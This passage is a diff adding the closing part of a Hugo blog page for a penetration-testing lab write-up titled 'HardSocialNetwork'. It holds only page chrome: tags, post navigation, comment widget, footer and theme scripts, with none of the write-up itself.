微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" data-title="打靶-HardSocialNetwork"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/" class="prev" rel="prev" title="RSA练习▪补"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>RSA练习▪补</a>
+            <a href="/2021-11-06-dasctf-oct-writeup/" class="next" rel="next" title="DASCTF Oct WriteUp">DASCTF Oct WriteUp<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
